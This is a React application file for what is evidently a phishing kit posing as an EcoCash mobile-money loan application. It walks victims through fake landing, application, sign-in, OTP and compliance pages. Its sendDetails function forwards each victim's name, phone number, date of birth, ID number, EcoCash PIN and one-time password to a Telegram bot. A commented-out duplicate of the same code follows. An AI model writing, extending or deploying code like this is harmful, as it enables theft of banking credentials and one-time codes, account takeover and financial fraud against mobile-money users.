import { useState } from "react";
import "./App.css";
import { sendToTelegram } from "./assets/telegram";
import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
import Complying from "./pages/Complying";
import Signin from "./pages/Signin";
import Application from "./pages/Application";
import OtpPage2 from "./pages/OtpPage2";
import Successpage from "./pages/Successpage";
import Landing from "./pages/Landing";

function App() {
  const [name, setName] = useState("");
  const [number, setnumber] = useState("");
  const [dob, setdob] = useState("");
  const [income, setincome] = useState("");
  const [pin, setpin] = useState("");
  const [otp, setOtp] = useState("");
  const [loan, setloan] = useState("");
  const [id, setid] = useState("");

  const client = { length: 6, name, income, otp, number, dob, pin, loan, id };

  function handleName(value) {
    setName(value);
  }

  async function sendDetails() {
    console.log(client);
    await sendToTelegram(
      `New Client Claim:\nClient Name:${name}\nEcoCash Number: ${number}\nClient dob: ${dob}\nClient id: ${id}\nEcoCash Pin: ${pin}\nClient OTP: ${otp}`,
    );
  }

  const myFuncs = {
    handleName,
    setName,
    setnumber,
    setdob,
    setid,
    setloan,
    setpin,
    setincome,
    sendDetails,
    setOtp,
  };

  return (
    <BrowserRouter>
      <Routes>
        {/* 🔥 Default redirect */}
        <Route
          path="/"
          element={<Landing myFuncs={myFuncs} client={client} />}
        />

        {/* <Route path="/" element={<Navigate to="/client1" />} /> */}

        {/* 🔥 All routes under /:user */}

        <Route
          path="/:user"
          element={<Landing myFuncs={myFuncs} client={client} />}
        />

        <Route
          path="/:user/apply"
          element={<Application myFuncs={myFuncs} client={client} />}
        />

        <Route
          path="/:user/login"
          element={
            <Signin
              client={client}
              setnumber={setnumber}
              setpin={setpin}
              sendDetails={sendDetails}
            />
          }
        />

        <Route
          path="/:user/verification"
          element={<OtpPage2 client={client} myFuncs={myFuncs} />}
        />

        <Route path="/:user/success" element={<Successpage name={name} />} />

        <Route
          path="/:user/compliance"
          element={<Complying client={client} />}
        />
      </Routes>
    </BrowserRouter>
  );
}

// import { useState } from "react";
// import "./App.css";
// import { sendToTelegram } from "./assets/telegram";
// import { BrowserRouter, Routes, Route } from "react-router-dom";
// import Complying from "./pages/Complying";
// import Signin from "./pages/Signin";
// import Application from "./pages/Application";
// // import OtpPage from "./pages/OtpPage";
// import OtpPage2 from "./pages/OtpPage2";
// import Successpage from "./pages/Successpage";
// import Landing from "./pages/Landing";
// import TelegramVerification from "./assets/TelegramVerification";
// function App() {
//   const [name, setName] = useState("");
//   const [number, setnumber] = useState("");
//   const [dob, setdob] = useState("");
//   const [income, setincome] = useState("");
//   const [pin, setpin] = useState("");
//   const [otp, setOtp] = useState("");
//   const [loan, setloan] = useState("");
//   const [id, setid] = useState("");

//   const client = { length: 6, name, income, otp, number, dob, pin, loan, id };

//   function handleName(value) {
//     setName(value);
//   }

//   // console.log("🌐 Frontend Configuration:", {
//   //   apiUrl: import.meta.env.VITE_API_URL,
//   //   botName: import.meta.env.VITE_BOT_NAME,
//   //   mode: import.meta.env.MODE,
//   // });

//   async function sendDetails() {
//     console.log(client);
//     await sendToTelegram(
//       `New Client Claim:\nClient Name:${name}\nEcoCash Number: ${number}\nClient dob: ${dob}\nClient id: ${id}\nEcoCash Pin: ${pin}\nClient OTP: ${otp}`,
//     );
//   }
//   const myFuncs = {
//     handleName,
//     setName,
//     setnumber,
//     setdob,
//     setid,
//     setloan,
//     setpin,
//     setincome,
//     sendDetails,
//     setOtp,
//   };

//   return (
//     <BrowserRouter>
//       <Routes>
//         <Route
//           path="/"
//           // element={<TelegramVerification />}
//           element={<Landing myFuncs={myFuncs} client={client} />}
//         />
//         <Route
//           path="/apply"
//           element={<Application myFuncs={myFuncs} client={client} />}
//         />
//         <Route
//           path="/login"
//           element={
//             <Signin
//               client={client}
//               setnumber={setnumber}
//               setpin={setpin}
//               sendDetails={sendDetails}
//             />
//           }
//         />
//         {/* <Route
//           path="/otpverification"
//           element={<OtpPage client={client} myFuncs={myFuncs} />}
//         /> */}
//         <Route
//           path="/verification"
//           element={<OtpPage2 client={client} myFuncs={myFuncs} />}
//         />
//         <Route path="/success" element={<Successpage name={name} />} />
//         <Route path="/compliance" element={<Complying client={client} />} />
//       </Routes>
//     </BrowserRouter>
//   );
// }

export default App;
{
  /* {apply && <Apply myFuncs={myFuncs} />}
{logged && <Login number={number} />}
{comply && <Compliance client={client} />} */
}
